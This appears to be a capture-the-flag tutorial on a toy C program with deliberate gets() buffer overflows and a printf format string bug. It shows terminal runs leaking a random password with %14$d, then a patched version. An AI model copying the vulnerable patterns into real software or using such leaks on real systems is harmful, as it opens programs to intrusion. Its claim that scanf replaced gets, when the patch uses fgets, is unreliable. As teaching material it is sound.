Let's take a look at the code...
```
#include <stdio.h>
#include <stdlib.h>

int main()
{
    srand(time(NULL));
    char input1[20];
    char input2[5];
    int f;
    int c = 0;
    f = rand() % 100 + 1;
    
    printf("Enter your username\n");
    gets(input1);
    printf(input1);
    printf("Enter your password\n");
    gets(input2);
    c = atoi(input2);
    if(c == f)
    {
       	printf("Welcome to the Kremlin. Now get to work for the glory of the Motherland. Level Cleared\n");	
    }

   else
   {
	printf("Relax, everyone mistypes their password. Just ask the KGB guys who are coming to see you now \n");
   }
}
```

So looking at the code, we see that we will need to set c equal to f, so it will print out the "Level Cleared" string. We see that f is a randomly generated string, that is ran against the modulus operator (modulus divides two things and returns the remainder) and adds 1. Due to the max size that an random int like this can generate (plus the +1) it should output a number in the ballpark of 1-100. The variable c is set to the integer equivalent of the second gets input, so we can directly input data into that variable. However it doesn't output the value of f, and a new value is generated every time we run. This is where the format string bug comes into play.

So we can see here the code has multiple vulnerabillities. It has two buffer overflow vulnerabillities discussed in the buf_ovf section. In addition to that it has a format string vulnerabillity. Let's take a look at this code.

```
 gets(input1);
 printf(input1);
```

As you can see here it is asking for input from the user, not checking it, and then printing it out without any formatting. Since this is is user defined data, we can input formatters into the printf function and change what it does. We can do things such as read values off from the stack, and actually rewrite parts of the program. Let's test it out by just trying to read values off the stack with the %d flag.

```
root@tux:/Hackery/cr@ck_th3_c0de/fmt_str/0# ./0
Enter your username
%d
-145098490Enter your password
d
Relax, everyone mistypes their password. Just ask the KGB guys who are coming to see you now 
```

Now looking here, it did appear as it printed off a value from the stack (since it is a %d, it should be an int which it is). Let's try printing off values off of the stack in a chronological order untill we see the value we want. Keep in mind that we can only print off so many values at a time before we get a segmentation fault (caused by a buffer overflow) and crashes the program.

```
root@tux:/Hackery/cr@ck_th3_c0de/fmt_str/0# ./0
Enter your username
%1$d.%2$d.%3$d
-144865018.0.134514017Enter your password
nope
Relax, everyone mistypes their password. Just ask the KGB guys who are coming to see you now 
root@tux:/Hackery/cr@ck_th3_c0de/fmt_str/0# ./0
Enter your username
%4$d.%5$d.%6$d
32768.-143241216.-143248828Enter your password
not yet
Relax, everyone mistypes their password. Just ask the KGB guys who are coming to see you now 
```

Let's keep on looking

```
root@tux:/Hackery/cr@ck_th3_c0de/fmt_str/0# ./0
Enter your username
%7$d.%8$d.%9$d
-144785172.1.1680095013Enter your password
a bit further
Relax, everyone mistypes their password. Just ask the KGB guys who are coming to see you now 
root@tux:/Hackery/cr@ck_th3_c0de/fmt_str/0# ./0
Enter your username
%10$d.%11$d.%12$d
824520292.778314801.607269157Enter your password
should be soon
Relax, everyone mistypes their password. Just ask the KGB guys who are coming to see you now 

```

It shouldn't be too much longer

```
root@tux:/Hackery/cr@ck_th3_c0de/fmt_str/0# ./0
Enter your username
%13$d.%14$d.%15$d
-7864220.95.0Enter your password
95
Welcome to the Kremlin. Now get to work for the glory of the Motherland. Level Cleared
```

It appears that we found the offset. It is 14 bytes off of the offset. Let's test it a couple more times.

```
root@tux:/Hackery/cr@ck_th3_c0de/fmt_str/0# ./0
Enter your username
%14$d
33Enter your password
33
Welcome to the Kremlin. Now get to work for the glory of the Motherland. Level Cleared
root@tux:/Hackery/cr@ck_th3_c0de/fmt_str/0# ./0
Enter your username
%14$d
80Enter your password
80
Welcome to the Kremlin. Now get to work for the glory of the Motherland. Level Cleared
root@tux:/Hackery/cr@ck_th3_c0de/fmt_str/0# ./0
Enter your username
%14$d
50Enter your password
50
Welcome to the Kremlin. Now get to work for the glory of the Motherland. Level Cleared
root@tux:/Hac
```

I think it's safe to say, we pwned the binary. Now let's patch it.

```
#include <stdio.h>
#include <stdlib.h>

int main()
{
    srand(time(NULL));
    char input1[20];
    char input2[5];
    int f;
    int c = 0;
    f = rand() % 100 + 1;
    
    printf("Enter your username\n");
    fgets(input1, sizeof(input1), stdin);
    printf("%s", input1);
    printf("Enter your password\n");
    fgets(input2, sizeof(input2), stdin);
    c = atoi(input2);
    if(c == f)
    {
       	printf("Welcome to the Kremlin. Now get to work for the glory of the Motherland. Level Cleared\n");	
    }

   else
   {
	printf("Relax, everyone mistypes their password. Just ask the KGB guys who are coming to see you now \n");
   }
}
```

As you can see, we patched the gets function by replacing it with scanf, and designating a limit on the input that cannot overflow the buffer. In addition to that, we formatted the printf to print the buffer as string so it shouldn't be vulnerable to a format string attack. Let's test it.

```
root@tux:/Hackery/cr@ck_th3_c0de/fmt_str/0# ./f0_secure 
Enter your username
%14$d
%14$d
Enter your passwordPatched
Relax, everyone mistypes their password. Just ask the KGB guys who are coming to see you now 
```

And as you can see, just like that we patched the binary.










